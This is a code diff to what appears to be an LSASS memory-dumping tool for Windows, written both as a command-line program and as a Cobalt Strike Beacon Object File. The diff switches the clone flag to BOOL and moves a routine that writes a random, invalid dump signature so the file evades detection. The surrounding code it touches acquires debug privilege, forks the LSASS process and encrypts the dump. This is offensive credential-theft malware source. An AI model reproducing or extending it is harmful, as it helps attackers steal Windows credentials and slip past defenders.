@@ -339,7 +339,7 @@ BOOL enable_debug_priv(void)
 
 HANDLE get_process_handle(
     DWORD dwPid,
-    int clone
+    BOOL clone
 )
 {
     NTSTATUS status;
@@ -360,7 +360,7 @@ HANDLE get_process_handle(
 
     DWORD dwFlags;
 
-    if (clone == 1)
+    if (clone)
         dwFlags = PROCESS_CREATE_PROCESS;
     else
         dwFlags = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
@@ -408,7 +408,8 @@ HANDLE get_process_handle(
         );
         return NULL;
     }
-    if (clone == 1)
+
+    if (clone)
     {
         // fork the LSASS process
         HANDLE hCloneProcess = NULL;
@@ -1294,6 +1295,23 @@ HANDLE find_lsass(void)
     }
 }
 
+void generate_invalid_sig(char* signature)
+{
+    time_t t;
+    MSVCRT$srand((unsigned) MSVCRT$time(&t));
+    signature[0] = 'P';
+    signature[1] = 'M';
+    signature[2] = 'D';
+    signature[3] = 'M';
+    while (!MSVCRT$strncmp(signature, "PMDM", 4))
+    {
+        signature[0] = MSVCRT$rand() & 0xFF;
+        signature[1] = MSVCRT$rand() & 0xFF;
+        signature[2] = MSVCRT$rand() & 0xFF;
+        signature[3] = MSVCRT$rand() & 0xFF;
+    }
+}
+
 void encrypt_dump(
     void* BaseAddress,
     ULONG32 Size
@@ -1310,16 +1328,16 @@ void go(char* args, int length)
     int    pid;
     char*  dump_name;
     int    do_write;
-    int    clone;
-    char*  signature;
+    BOOL   clone;
+    BOOL   use_valid_sig;
     BOOL   success;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
     dump_name = BeaconDataExtract(&parser, NULL);
     do_write = BeaconDataInt(&parser);
-    signature = BeaconDataExtract(&parser, NULL);
-    clone = BeaconDataInt(&parser);
+    use_valid_sig = (BOOL)BeaconDataInt(&parser);
+    clone = (BOOL)BeaconDataInt(&parser);
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1342,13 +1360,27 @@ void go(char* args, int length)
         return;
     }
 
-    if (clone == 1 && pid == 0)
+    if (clone && !pid)
     {
         BeaconPrintf(
             CALLBACK_ERROR,
             "Process cloning requires a PID"
         );
         return;
+    }
+
+    // set the signature
+    char signature[4];
+    if (use_valid_sig)
+    {
+        signature[0] = 'P';
+        signature[1] = 'M';
+        signature[2] = 'D';
+        signature[3] = 'M';
+    }
+    else
+    {
+        generate_invalid_sig(signature);
     }
 
     success = enable_debug_priv();
@@ -1489,27 +1521,10 @@ void usage(char* procname)
     printf("            print this help message and leave");
 }
 
-void get_invalid_sig(char* signature)
-{
-    time_t t;
-    srand((unsigned) time(&t));
-    signature[0] = 'P';
-    signature[1] = 'M';
-    signature[2] = 'D';
-    signature[3] = 'M';
-    while (!strncmp(signature, "PMDM", 4))
-    {
-        signature[0] = rand() & 0xFF;
-        signature[1] = rand() & 0xFF;
-        signature[2] = rand() & 0xFF;
-        signature[3] = rand() & 0xFF;
-    }
-}
-
 int main(int argc, char* argv[])
 {
     int pid = 0;
-    int clone = 0;
+    BOOL clone = FALSE;
     char* dump_name = NULL;
     char signature[4];
     BOOL success;
@@ -1524,8 +1539,8 @@ int main(int argc, char* argv[])
     }
 #endif
 
-    // generate a random signature
-    get_invalid_sig(signature);
+    // by default, set an invalid signature
+    generate_invalid_sig(signature);
 
     for (int i = 1; i < argc; ++i)
     {
@@ -1550,7 +1565,7 @@ int main(int argc, char* argv[])
         else if (!strncmp(argv[i], "-c", 3) ||
                  !strncmp(argv[i], "--clone", 8))
         {
-            clone = 1;
+            clone = TRUE;
         }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
@@ -1577,7 +1592,7 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (clone == 1 && pid == 0)
+    if (clone && !pid)
     {
         printf("Process cloning requires a PID");
         return -1;
